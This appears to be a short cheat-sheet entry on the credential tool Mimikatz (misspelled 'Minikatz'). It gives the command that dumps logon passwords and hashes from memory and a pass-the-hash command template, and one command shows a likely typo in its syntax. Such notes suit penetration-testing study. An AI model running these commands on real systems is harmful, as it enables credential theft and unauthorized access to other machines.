**1. Minikatz**
- Get password, hash, PIN from RAM
- Privilege escalation
- Perform attack techniques like Pass-the-Hash, Pass-the-Ticket, Golden Ticket
```
sekurlsa::logonPasswords
```

Pass-to-hash attack: accept an authenticated user based on the hash to execute the action
```
sekurlsa:pth /user:<name> /domain:<domain> /ntlm:<hash>
```
